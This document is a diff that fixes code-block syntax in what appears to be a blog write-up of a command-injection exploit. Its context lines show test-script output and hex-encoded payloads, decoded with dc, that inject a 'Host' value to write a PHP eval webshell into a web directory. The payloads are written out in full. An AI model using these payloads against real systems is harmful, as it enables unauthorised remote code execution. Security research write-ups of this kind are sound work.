@@ -89,7 +89,7 @@ This means you have to avoid any forward slashes in the Base64 output, which is 
 
 I found a better solution was to hex encode the PHP, and decode it with `dc`. This is better, but it still isn't amazing - the string injected is even longer.
 
-{%highlight bash %}
+{% highlight bash %}
 $ python3 test2.py 
 (+) Using command injection bug to inject webshell
 Host: ' *; echo '16i 3C3F24613D666F70656E28222F7573722F6C6F63616C2F7777772F73797374656D5F616476616E6365645F636F6E74726F6C2E706870222C22772229206F722064696528293B24743D273C3F706870206576616C28245F504F53545B313333375D293B3F3E273B6677726974652824612C2474293B66636C6F736528202461293B3F3E P' | dc | php; '
@@ -102,7 +102,7 @@ $
 
 I then realised we could simply encode a "echo 'shell code' > shell_path" and pass it to the shell using this trick, much shrinking our payload, which brings us to the final payload being tested below. 
 
-{%highlight bash %}
+{% highlight bash %}
 $ python3 test3.py 
 (+) Using command injection bug to inject webshell
 Host: ' *; echo '16i 6563686F20273C3F706870206576616C28245F504F53545B313333375D293B3F3E27203E202F7573722F6C6F63616C2F7777772F73797374656D5F616476616E6365645F636F6E74726F6C2E706870 P' | dc | sh; '
